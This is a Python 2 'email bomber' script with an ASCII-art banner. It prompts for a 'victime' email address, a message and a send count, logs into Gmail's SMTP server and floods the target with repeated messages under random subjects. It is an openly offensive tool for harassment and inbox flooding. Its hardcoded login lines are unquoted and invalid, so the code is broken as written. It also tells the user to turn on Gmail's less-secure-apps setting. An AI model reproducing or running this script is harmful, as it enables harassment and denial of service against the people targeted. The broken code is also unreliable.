# -*- coding: utf-8 -*-
# =========================================================================================================================================
import os
import random
import smtplib
import sys
import getpass
import time
# ======================= HEADING ================================================================================================
os.system('clear')
print ('''
   _   __                             ___  
  
  | |/ /  __ _ _ __ _ __ ___   __ _     ) |
  
  | |\  \ (_| | |  | | | | | | (_| |  |_|  
  \)
                            B-9
''')
print(" ")
#########################   USER INFO ##########################
user = artur 
passworde = 92-98138-92728
print(" ")
victime = raw_input('\033[94m[?]\033[97m The victime \033[91mEMAIL\033[97m : \033[93m')
message = raw_input('\033[94m[?]\033[97m Your \033[92mMessage\033[97m : \033[93m')
print(" ")
hani = input('\033[94m[?] \033[97mNumber of \033[92msend\033[97m : \033[93m')
print(" ")
print("\033[94m[*] \033[97mSending : ")
############################### SMTP_SERVER INFO ##################
smtp_server = 'smtp.gmail.com'
port = 587

##########################  Login ############################
try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passworde)
###################### SENDING #########################################
    for i in range(1, hani+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
        server.sendmail(user,victime,msg)
        print ("\033[94m[✔]\033[97m Email \033[92mSENT\033[97m  :\033[93m %i") % i
        sys.stdout.flush()
    server.quit()
    print ('\033[93m[✔]\033[97m All \033[97mMessage was\033[92m sent\033[97m ')
    
    
except KeyboardInterrupt:
    print ('[✘] Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print(" ")
    print("\033[94m[✘] \033[91mError \033[97m:")
    print ('\033[94m[✘] \033[97mThe \033[93musername \033[97mor \033[93mpassword \033[97myou entered is incorrect.')
    print ("\033[94m[!] \033[97mCheck if the Options of 'Applications are less secure' is enabled\nCheck at https://myaccount.google.com/lesssecureapps")
    sys.exit()
